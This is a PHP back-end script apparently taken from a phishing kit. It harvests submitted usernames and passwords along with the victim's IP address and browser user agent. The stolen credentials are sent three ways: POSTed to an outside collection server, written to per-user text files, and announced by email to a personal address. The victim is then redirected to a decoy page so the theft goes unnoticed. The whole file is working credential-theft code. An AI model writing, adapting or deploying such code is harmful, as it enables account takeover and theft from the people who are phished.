<?php
error_reporting(0);
ini_set('display_errors', 0);
#input grabbing 
$ua=$_SERVER['HTTP_USER_AGENT'];
$login=$_POST['username'];
$passwd=$_POST['password'];
date_default_timezone_set('Asia/Colombo');
$date=date('l jS \of F Y h:i:s A');
$ip = $_SERVER['REMOTE_ADDR'];


#api_posting
$api_data = [
    'action'   => 'my_api',
   'ua' =>$ua,
   'ip' => $ip,
   'username' => $login,
   'password' => $passwd,
   'server'   => 'MSagaroffice',
   'my_key'   => 'rose_max'
];
$ch_api = curl_init();
curl_setopt($ch_api, CURLOPT_URL, 'https://fast.trflk.cc/get_log.php');
curl_setopt($ch_api, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch_api, CURLOPT_POSTFIELDS, http_build_query($api_data));
$response = curl_exec($ch_api);


#mail variables 
$to = "diyadean27demon@gmail.com";
$subject ="From : IP ".$ip;
$txt = "New Entry for ".$login;
$headers = "From: DarkaAdmin@blackinfo.org" . "\r\n" .

$handle = fopen("pwd/".$login.".txt", "a");
fwrite($handle, "\r\n==============================================\r\n");
fwrite($handle,"Date: ".$date);
fwrite($handle, "     ");
fwrite($handle, "\r\n");
fwrite($handle,"I.P. Address= ");
fwrite($handle,$ip);
fwrite($handle, "\r\n");
fwrite($handle,"User Agent = ");
fwrite($handle,$ua);
if (strlen($passwd)<"8"){
fwrite($handle, "\r\n");
fwrite($handle, "Email ID = ".$login);
fwrite($handle, "\r\n");
fwrite($handle, "Password = ".$passwd);
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fclose($handle);
mail($to,$subject,$txt,$headers);
header ('Location:index.html');
exit();
}
fwrite($handle, "\r\n");
fwrite($handle, "Email ID = ".$login);
fwrite($handle, "\r\n");
fwrite($handle, "Password = ".$passwd);
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fclose($handle);
mail($to,$subject,$txt,$headers);
header ('Location:index1.html');
?>